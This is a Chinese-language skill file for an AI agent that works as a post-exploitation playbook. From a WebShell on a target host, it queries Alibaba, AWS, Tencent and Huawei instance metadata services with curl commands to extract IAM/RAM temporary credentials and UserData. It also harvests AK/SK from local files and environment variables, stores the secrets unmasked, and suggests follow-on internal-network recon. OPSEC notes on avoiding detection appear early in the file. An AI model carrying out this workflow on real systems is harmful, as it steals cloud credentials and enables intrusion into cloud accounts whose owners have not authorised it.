---
name: collect-cloud-metadata
description: 从目标主机读取云平台实例元数据（IMDSv1/v2），提取 IAM 角色凭据、AK/SK、实例身份信息。支持阿里云、AWS、腾讯云、华为云。当任务涉及云服务器、EC2、ECS、IMDS、元数据服务、AK/SK、InstanceProfileCredentials 时使用。
enabled: true
---

# 读取云平台实例元数据

当用户希望从云服务器上获取实例元数据、IAM 临时凭据或 AK/SK 时，使用这个 skill。

---

## 一、OPSEC 与环境约束

| 原则 | 说明 |
|---|---|
| 只读操作 | 不使用云凭据调用云 API、不修改云资源、不创建实例 |
| 低噪声 | 元数据请求为本地回环，不经过外部网络，但 CloudTrail/ActionTrail 可能记录凭据使用 |
| 超时控制 | 每个探活请求 3 秒超时，避免长时间阻塞 |
| 不利用凭据 | 只收集不使用，避免触发云平台异常行为告警 |

**WebShell 环境注意：**
- 元数据服务通过 link-local 地址访问（169.254.169.254 / 100.100.100.200），不需要外网
- 容器环境中元数据可能被 iptables 规则阻断（EKS/ACK 的 Pod 级别限制）
- 部分云平台强制 IMDSv2（需要先获取 Token），IMDSv1 直接请求会返回 401
- `curl` 可能不可用，需要回退到 `wget -qO-` 或 `/dev/tcp` 方式
- 临时凭据有过期时间（通常 6 小时），提取后需记录过期时间
- 华为云和 AWS 共用 169.254.169.254，需通过响应内容区分
- WebShell 进程可能在容器内，容器的元数据和宿主机不同

---

## 二、目标

提取以下信息：

- 云平台类型（阿里云 / AWS / 腾讯云 / 华为云）
- 实例 ID、区域、可用区
- IAM 角色名和临时凭据（AccessKeyId / SecretAccessKey / Token）
- 实例绑定的 VPC/网络信息
- 用户数据（UserData，如有）
- 本地存储的长期 AK/SK（~/.aws/credentials 等）

---

## 三、工作流程

### 执行前：制定计划

在任何工具调用前，先输出：

1. **目标**：从目标主机读取云平台实例元数据，提取 IAM 临时凭据和实例身份信息
2. **路径**：按顺序探活各云平台元数据地址 → 命中后进入完整提取 → 同时搜索本地 AK/SK 文件和环境变量
3. **终止条件**：确认云平台类型并提取到实例信息和 IAM 凭据，或所有平台均探活失败且本地无凭据文件时停止

如果已有侦察摘要，先读取 `hostProfile` 和 `networkProfile` 判断是否为云主机。

### 第一阶段：元数据服务探活

按以下顺序依次探活（3 秒超时），命中后立即进入该平台完整提取：

| 顺序 | 云平台 | 探活地址 | 区分方式 |
|---|---|---|---|
| 1 | 阿里云 | `http://100.100.100.200/latest/meta-data/` | 独立 IP |
| 2 | AWS | `http://169.254.169.254/latest/meta-data/` | 响应含 ami-id |
| 3 | 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` | 独立域名 |
| 4 | 华为云 | `http://169.254.169.254/openstack/latest/meta_data.json` | OpenStack 格式 |

```bash
# 探活命令模板（每个 3 秒超时）
curl -s --connect-timeout 3 <URL>
```

### 第二阶段：完整元数据提取

#### 阿里云 ECS

```bash
curl -s http://100.100.100.200/latest/meta-data/instance-id
curl -s http://100.100.100.200/latest/meta-data/region-id
curl -s http://100.100.100.200/latest/meta-data/zone-id
# RAM 角色
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/
# 临时凭据（替换 <RoleName>）
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/<RoleName>
```

#### AWS EC2（IMDSv1）

```bash
curl -s http://169.254.169.254/latest/meta-data/instance-id
curl -s http://169.254.169.254/latest/meta-data/placement/region
curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone
# IAM 角色
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 临时凭据（替换 <RoleName>）
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
```

#### AWS EC2（IMDSv2，需先获取 Token）

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### 腾讯云 CVM

```bash
curl -s http://metadata.tencentyun.com/latest/meta-data/instance-id
curl -s http://metadata.tencentyun.com/latest/meta-data/placement/region
# CAM 角色凭据
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<RoleName>
```

#### 华为云 ECS

```bash
curl -s http://169.254.169.254/openstack/latest/meta_data.json
curl -s http://169.254.169.254/openstack/latest/securitykey
```

### 第三阶段：本地凭据文件搜索（并发）

同时搜索本地存储的长期 AK/SK：

**Linux/macOS：**

| 文件 | 云平台 |
|---|---|
| `~/.aws/credentials` | AWS |
| `~/.aws/config` | AWS |
| `~/.aliyun/config.json` | 阿里云 |
| `~/.tccli/default.credential` | 腾讯云 |

**Windows：**

| 文件 | 云平台 |
|---|---|
| `%USERPROFILE%\.aws\credentials` | AWS |
| `%USERPROFILE%\.aliyun\config.json` | 阿里云 |
| `%USERPROFILE%\.tccli\default.credential` | 腾讯云 |

**环境变量（使用 `exec` 获取后过滤）：**

重点关注：`AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`、`ALIBABA_CLOUD_ACCESS_KEY_ID`、`TENCENTCLOUD_SECRET_ID`

### 第四阶段：UserData 提取（可选）

```bash
# AWS
curl -s http://169.254.169.254/latest/user-data
# 阿里云
curl -s http://100.100.100.200/latest/user-data/
# 腾讯云
curl -s http://metadata.tencentyun.com/latest/user-data
```

UserData 中可能包含初始化脚本、密码、配置信息。

---

## 四、工具优先级

| 优先级 | 工具 | 用途 |
|---|---|---|
| 1 | `HttpRequestTools` | `httpRequest` 请求元数据服务（169.254.169.254 / 100.100.100.200），替代 exec curl 模式 |
| 2 | `CommandTools` | `exec` 获取环境变量、`exec` 回退（当 HttpRequestTools 不可用时） |
| 3 | `FileTools` | 读取本地凭据文件（~/.aws/credentials 等） |
| 4 | `BasicInfoTools` | OS 和网络环境识别 |

---

## 五、失败回退

| 场景 | 回退策略 |
|---|---|
| curl 不可用 | 尝试 `wget -qO- --timeout=3` |
| wget 也不可用 | 尝试 `/dev/tcp` 或 Python one-liner |
| IMDSv1 返回 401 | 切换到 IMDSv2（先获取 Token） |
| 所有元数据地址超时 | 可能不是云主机，只搜索本地凭据文件 |
| 容器内元数据被阻断 | 标注"容器级别 IMDS 限制"，只搜索本地凭据 |
| RAM/IAM 角色为空 | 实例未绑定角色，只提取实例基础信息 |
| 本地凭据文件不存在 | 从环境变量中搜索 |
| 华为云和 AWS 地址冲突 | 通过响应格式区分（OpenStack JSON vs AWS 文本） |

---

## 六、输出格式

```markdown
## 云平台元数据摘要

**云平台**：{阿里云 / AWS / 腾讯云 / 华为云 / 未识别}
**实例 ID**：{instance-id}
**区域**：{region}
**IAM 角色**：{role_name / 未绑定}
**凭据类型**：{临时凭据 / 长期 AK/SK / 无}

---

## 实例信息

| 字段 | 值 |
|------|-----|

## IAM / RAM 临时凭据

| 字段 | 值 |
|------|-----|
| AccessKeyId | {value} |
| SecretAccessKey | {value} |
| SecurityToken | {value} |
| 过期时间 | {expiration} |
| 角色名 | {role_name} |
| 置信度 | {high} |

## 本地凭据文件（如找到）

| 文件 | 云平台 | AccessKeyId | 类型 |
|------|--------|-------------|------|

## 证据

{探活响应和命令输出}

## 下一步建议

2~3 条具体建议
```

### 建议示例

| 发现 | 建议 |
|---|---|
| 获取到 IAM 临时凭据 | 使用 recon-internal-network skill 探测内网其他云资源 |
| 找到长期 AK/SK | 使用 hunt-credentials skill 搜索更多凭据 |
| 实例在 VPC 内 | 使用 recon-internal-network skill 探测 VPC 内网段 |
| UserData 含初始化脚本 | 分析脚本中的密码和配置信息 |
| 元数据不可达 | 可能在容器内，检查宿主机访问方式 |

---

## 七、结构化摘要写入

完成后必须：

1. `manage_recon_summary(action="append")` — 云平台、实例身份、角色名、凭据类型和过期时间
2. `manage_recon_summary(action="append")` — 机器可读字段（保存原始密钥和 Token，不脱敏）

结构化 patch 示例：

```json
{
  "cloudProfile": {
    "platform": "aws",
    "instanceId": "i-xxxx",
    "region": "ap-east-1",
    "availabilityZone": "ap-east-1a",
    "vpcId": "unknown",
    "metadataEndpoint": "http://169.254.169.254/latest/meta-data/",
    "imdsVersion": "v2",
    "evidence": ["IMDSv2 token request succeeded"]
  },
  "credentials": {
    "cloudTemporary": [
      {
        "platform": "aws",
        "roleName": "AppRole",
        "accessKeyId": "ASIAEXAMPLE123456",
        "secretAccessKey": "rawSecretAccessKeyValue",
        "securityToken": "rawSessionTokenValue",
        "sourceMasked": false,
        "expiration": "2026-05-14T12:00:00Z",
        "source": "instance metadata",
        "confidence": "high"
      }
    ],
    "cloud": [
      {
        "platform": "aws",
        "accessKeyId": "AKIAEXAMPLE789",
        "secretAccessKey": "longTermSecretKey",
        "source": "~/.aws/credentials",
        "confidence": "high"
      }
    ]
  },
  "businessRole": {
    "roles": ["cloud_host"],
    "evidence": ["metadata service reachable"]
  },
  "openQuestions": ["recon-internal-network"]
}
```

---

## 八、决策规则

| 场景 | 行为 |
|---|---|
| 探活失败（3 秒无响应） | 跳过该平台，不等待 |
| IMDSv1 失败 | 尝试 IMDSv2（带 Token） |
| 临时凭据有过期时间 | 在输出中明确标注过期时间 |
| 不要使用提取到的凭据 | 只收集不利用 |
| 本地 ~/.aws/credentials 存在 | 可能是长期密钥，置信度更高 |
| 华为云和 AWS 地址冲突 | 通过响应格式区分 |
| 容器内元数据被阻断 | 标注限制，只搜索本地凭据 |
| 发现凭据后 | 立即写入侦察摘要 |
| UserData 含敏感信息 | 摘录关键字段，不全量输出 |

---

## Skill 元数据

- riskLevel: `medium`
- accessMode: `metadata_read_sensitive`
- requiredTools: `HttpRequestTools`, `CommandTools`
- optionalTools: `FileTools`
- produces: `cloudProfile`, `credentials.cloudTemporary`, `credentials.cloud`, `businessRole.roles`, `openQuestions`
- structuredPatchPaths: `cloudProfile`, `credentials.cloudTemporary[]`, `credentials.cloud[]`
- recommendedNextSkills: `recon-internal-network`, `hunt-credentials`
- forbiddenByDefault: 使用云凭据调用云 API、修改云资源、创建实例、读取无关云账号资源
